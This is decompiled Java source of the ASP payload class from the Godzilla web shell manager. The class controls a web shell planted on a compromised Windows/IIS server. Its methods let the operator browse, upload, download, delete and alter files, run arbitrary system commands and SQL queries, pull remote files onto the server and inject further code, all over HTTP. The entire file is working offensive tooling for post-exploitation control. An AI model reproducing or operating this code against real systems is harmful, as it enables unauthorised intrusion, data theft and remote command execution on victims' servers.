/*     */ package shells.payloads.asp;
/*     */ 
/*     */ import core.Encoding;
/*     */ import core.annotation.PayloadAnnotation;
/*     */ import core.imp.Payload;
/*     */ import core.shell.ShellEntity;
/*     */ import java.io.InputStream;
/*     */ import java.util.Map;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ import util.http.ReqParameter;
/*     */ 
/*     */ @PayloadAnnotation(Name = "AspDynamicPayload")
/*     */ public class AspShell
/*     */   implements Payload
/*     */ {
/*     */   private static final String BASICINFO_REGEX = "(FileRoot|CurrentDir|OsInfo|CurrentUser) : (.+)";
/*  19 */   private static final String[] ALL_DATABASE_TYPE = new String[] { "mysql", "oracle", "sqlserver" };
/*     */   
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private Encoding encoding;
/*     */   private String fileRoot;
/*     */   private String currentDir;
/*     */   private String currentUser;
/*     */   private String osInfo;
/*     */   private String basicsInfo;
/*     */   private boolean isAlive;
/*     */   
/*     */   public void init(ShellEntity shellContext) {
/*  32 */     this.shell = shellContext;
/*  33 */     this.http = this.shell.getHttp();
/*  34 */     this.encoding = Encoding.getEncoding(this.shell);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String getFile(String filePath) {
/*  40 */     ReqParameter parameters = new ReqParameter();
/*  41 */     parameters.add("dirName", this.encoding.Encoding((filePath.length() > 0) ? filePath : " "));
/*  42 */     return this.encoding.Decoding(evalFunc(null, "getFile", parameters));
/*     */   }
/*     */ 
/*     */   
/*     */   public byte[] downloadFile(String fileName) {
/*  47 */     ReqParameter parameter = new ReqParameter();
/*  48 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/*  49 */     byte[] result = evalFunc(null, "readFileContent", parameter);
/*  50 */     return result;
/*     */   }
/*     */ 
/*     */   
/*     */   public String getBasicsInfo() {
/*  55 */     if (this.basicsInfo == null) {
/*  56 */       ReqParameter parameter = new ReqParameter();
/*  57 */       this.basicsInfo = this.encoding.Decoding(evalFunc(null, "getBasicsInfo", parameter));
/*     */     } 
/*  59 */     Map<String, String> pxMap = functions.matcherTwoChild(this.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser) : (.+)");
/*  60 */     this.fileRoot = pxMap.get("FileRoot");
/*  61 */     this.currentDir = pxMap.get("CurrentDir");
/*  62 */     this.currentUser = pxMap.get("CurrentUser");
/*  63 */     this.osInfo = pxMap.get("OsInfo");
/*  64 */     return this.basicsInfo;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean include(String codeName, byte[] binCode) {
/*  69 */     ReqParameter parameters = new ReqParameter();
/*  70 */     parameters.add("ICodeName", codeName);
/*  71 */     parameters.add("binCode", binCode);
/*  72 */     byte[] result = evalFunc(null, "includeCode", parameters);
/*  73 */     String resultString = (new String(result)).trim();
/*  74 */     if (resultString.equals("ok")) {
/*  75 */       return true;
/*     */     }
/*  77 */     Log.error(resultString);
/*  78 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void fillParameter(String className, String funcName, ReqParameter parameter) {
/*  84 */     if (className != null && className.trim().length() > 0) {
/*  85 */       parameter.add("codeName", className);
/*     */     }
/*  87 */     parameter.add("methodName", funcName);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] evalFunc(String className, String funcName, ReqParameter parameter) {
/*  93 */     fillParameter(className, funcName, parameter);
/*  94 */     byte[] data = parameter.serialize();
/*  95 */     return this.http.sendHttpResponse(data).getResult();
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean uploadFile(String fileName, byte[] data) {
/* 101 */     ReqParameter parameter = new ReqParameter();
/* 102 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 103 */     parameter.add("fileValue", data);
/* 104 */     byte[] result = evalFunc(null, "uploadFile", parameter);
/* 105 */     String stateString = this.encoding.Decoding(result);
/* 106 */     if ("ok".equals(stateString)) {
/* 107 */       return true;
/*     */     }
/* 109 */     Log.error(stateString);
/* 110 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean copyFile(String fileName, String newFile) {
/* 116 */     ReqParameter parameter = new ReqParameter();
/* 117 */     parameter.add("srcFileName", this.encoding.Encoding(fileName));
/* 118 */     parameter.add("destFileName", this.encoding.Encoding(newFile));
/* 119 */     byte[] result = evalFunc(null, "copyFile", parameter);
/* 120 */     String stateString = this.encoding.Decoding(result);
/* 121 */     if ("ok".equals(stateString)) {
/* 122 */       return true;
/*     */     }
/* 124 */     Log.error(stateString);
/* 125 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean deleteFile(String fileName) {
/* 131 */     ReqParameter parameter = new ReqParameter();
/* 132 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 133 */     byte[] result = evalFunc(null, "deleteFile", parameter);
/* 134 */     String stateString = this.encoding.Decoding(result);
/* 135 */     if ("ok".equals(stateString)) {
/* 136 */       return true;
/*     */     }
/* 138 */     Log.error(stateString);
/* 139 */     return false;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean newFile(String fileName) {
/* 144 */     ReqParameter parameter = new ReqParameter();
/* 145 */     parameter.add("fileName", this.encoding.Encoding(fileName));
/* 146 */     byte[] result = evalFunc(null, "newFile", parameter);
/* 147 */     String stateString = this.encoding.Decoding(result);
/* 148 */     if ("ok".equals(stateString)) {
/* 149 */       return true;
/*     */     }
/* 151 */     Log.error(stateString);
/* 152 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean newDir(String fileName) {
/* 158 */     ReqParameter parameter = new ReqParameter();
/* 159 */     parameter.add("dirName", this.encoding.Encoding(fileName));
/* 160 */     byte[] result = evalFunc(null, "newDir", parameter);
/* 161 */     String stateString = this.encoding.Decoding(result);
/* 162 */     if ("ok".equals(stateString)) {
/* 163 */       return true;
/*     */     }
/* 165 */     Log.error(stateString);
/* 166 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public String execSql(String dbType, String dbHost, int dbPort, String dbUsername, String dbPassword, String execType, Map options, String execSql) {
/* 173 */     ReqParameter parameter = new ReqParameter();
/* 174 */     parameter.add("dbType", dbType);
/* 175 */     parameter.add("dbHost", dbHost);
/* 176 */     parameter.add("dbPort", Integer.toString(dbPort));
/* 177 */     parameter.add("dbUsername", dbUsername);
/* 178 */     parameter.add("dbPassword", dbPassword);
/* 179 */     parameter.add("execType", execType);
/* 180 */     parameter.add("execSql", this.shell.getDbEncodingModule().Encoding(execSql));
/* 181 */     if (options != null) {
/* 182 */       String dbCharset = (String)options.get("dbCharset");
/* 183 */       String currentDb = (String)options.get("currentDb");
/* 184 */       if (dbCharset != null) {
/* 185 */         parameter.add("dbCharset", dbCharset);
/* 186 */         parameter.add("execSql", Encoding.getEncoding(dbCharset).Encoding(execSql));
/*     */       } 
/* 188 */       if (currentDb != null) {
/* 189 */         parameter.add("currentDb", currentDb);
/*     */       }
/*     */     } 
/* 192 */     byte[] result = evalFunc(null, "execSql", parameter);
/* 193 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */   
/*     */   public String currentDir() {
/* 198 */     if (this.currentDir != null) {
/* 199 */       return functions.formatDir(this.currentDir);
/*     */     }
/* 201 */     getBasicsInfo();
/* 202 */     return functions.formatDir(this.currentDir);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean test() {
/* 208 */     ReqParameter parameter = new ReqParameter();
/* 209 */     byte[] result = evalFunc(null, "test", parameter);
/* 210 */     String codeString = new String(result);
/* 211 */     if (codeString.trim().equals("ok")) {
/* 212 */       this.isAlive = true;
/* 213 */       return true;
/*     */     } 
/* 215 */     Log.error(codeString);
/* 216 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String currentUserName() {
/* 222 */     if (this.currentUser != null) {
/* 223 */       return this.currentUser;
/*     */     }
/* 225 */     getBasicsInfo();
/* 226 */     return this.currentUser;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String bigFileUpload(String fileName, int position, byte[] content) {
/* 232 */     if (position == 0) {
/* 233 */       newFile(fileName);
/*     */     }
/* 235 */     ReqParameter reqParameter = new ReqParameter();
/* 236 */     reqParameter.add("fileContents", content);
/* 237 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 238 */     reqParameter.add("position", String.valueOf(position));
/* 239 */     byte[] result = evalFunc(null, "bigFileUpload", reqParameter);
/* 240 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */   
/*     */   public String getTempDirectory() {
/* 245 */     return "c:/windows/temp/";
/*     */   }
/*     */ 
/*     */   
/*     */   public byte[] bigFileDownload(String fileName, int position, int readByteNum) {
/* 250 */     ReqParameter reqParameter = new ReqParameter();
/* 251 */     reqParameter.add("position", String.valueOf(position));
/* 252 */     reqParameter.add("readByteNum", String.valueOf(readByteNum));
/* 253 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 254 */     reqParameter.add("mode", "read");
/* 255 */     return evalFunc(null, "bigFileDownload", reqParameter);
/*     */   }
/*     */ 
/*     */   
/*     */   public int getFileSize(String fileName) {
/* 260 */     ReqParameter reqParameter = new ReqParameter();
/* 261 */     reqParameter.add("fileName", this.encoding.Encoding(fileName));
/* 262 */     reqParameter.add("mode", "fileSize");
/* 263 */     byte[] result = evalFunc(null, "bigFileDownload", reqParameter);
/* 264 */     String ret = this.encoding.Decoding(result);
/*     */     try {
/* 266 */       return Integer.parseInt(ret);
/* 267 */     } catch (Exception e) {
/* 268 */       Log.error(e);
/* 269 */       Log.error(ret);
/*     */       
/* 271 */       return -1;
/*     */     } 
/*     */   }
/*     */   
/*     */   public boolean isWindows() {
/* 276 */     return (currentDir().charAt(0) != '/');
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean isAlive() {
/* 281 */     return this.isAlive;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean isX64() {
/* 286 */     return false;
/*     */   }
/*     */ 
/*     */   
/*     */   public String[] listFileRoot() {
/* 291 */     if (this.fileRoot != null) {
/* 292 */       return this.fileRoot.split(";");
/*     */     }
/* 294 */     getBasicsInfo();
/* 295 */     return this.fileRoot.split(";");
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String execCommand(String commandStr) {
/* 301 */     ReqParameter parameter = new ReqParameter();
/* 302 */     parameter.add("cmdLine", this.encoding.Encoding(commandStr));
/* 303 */     byte[] result = evalFunc(null, "execCommand", parameter);
/* 304 */     return this.encoding.Decoding(result);
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public String getOsInfo() {
/* 310 */     if (this.osInfo != null) {
/* 311 */       return this.osInfo;
/*     */     }
/* 313 */     getBasicsInfo();
/* 314 */     return this.osInfo;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public String[] getAllDatabaseType() {
/* 321 */     return ALL_DATABASE_TYPE;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean moveFile(String fileName, String newFile) {
/* 326 */     ReqParameter parameter = new ReqParameter();
/* 327 */     parameter.add("srcFileName", this.encoding.Encoding(fileName));
/* 328 */     parameter.add("destFileName", this.encoding.Encoding(newFile));
/* 329 */     byte[] result = evalFunc(null, "moveFile", parameter);
/* 330 */     String stasteString = this.encoding.Decoding(result);
/* 331 */     if ("ok".equals(stasteString)) {
/* 332 */       return true;
/*     */     }
/* 334 */     Log.error(stasteString);
/* 335 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] getPayload() {
/* 342 */     byte[] data = null;
/*     */     try {
/* 344 */       InputStream fileInputStream = AspShell.class.getResourceAsStream("assets/payload.asp");
/* 345 */       data = functions.readInputStream(fileInputStream);
/* 346 */       fileInputStream.close();
/* 347 */     } catch (Exception e) {
/* 348 */       Log.error(e);
/*     */     } 
/* 350 */     return data;
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean fileRemoteDown(String url, String saveFile) {
/* 355 */     ReqParameter reqParameter = new ReqParameter();
/* 356 */     reqParameter.add("url", this.encoding.Encoding(url));
/* 357 */     reqParameter.add("saveFile", this.encoding.Encoding(saveFile));
/* 358 */     String result = this.encoding.Decoding(evalFunc(null, "fileRemoteDown", reqParameter));
/* 359 */     if ("ok".equals(result)) {
/* 360 */       return true;
/*     */     }
/* 362 */     Log.error(result);
/* 363 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean setFileAttr(String file, String type, String fileAttr) {
/* 369 */     ReqParameter reqParameter = new ReqParameter();
/* 370 */     reqParameter.add("type", type);
/* 371 */     reqParameter.add("fileName", this.encoding.Encoding(file));
/* 372 */     reqParameter.add("attr", fileAttr);
/* 373 */     String result = this.encoding.Decoding(evalFunc(null, "setFileAttr", reqParameter));
/* 374 */     if ("ok".equals(result)) {
/* 375 */       return true;
/*     */     }
/* 377 */     Log.error(result);
/* 378 */     return false;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean close() {
/* 384 */     this.isAlive = false;
/* 385 */     ReqParameter reqParameter = new ReqParameter();
/* 386 */     String result = this.encoding.Decoding(evalFunc(null, "closeEx", reqParameter));
/* 387 */     if ("ok".equals(result)) {
/* 388 */       return true;
/*     */     }
/* 390 */     Log.error(result);
/* 391 */     return false;
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\payloads\asp\AspShell.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */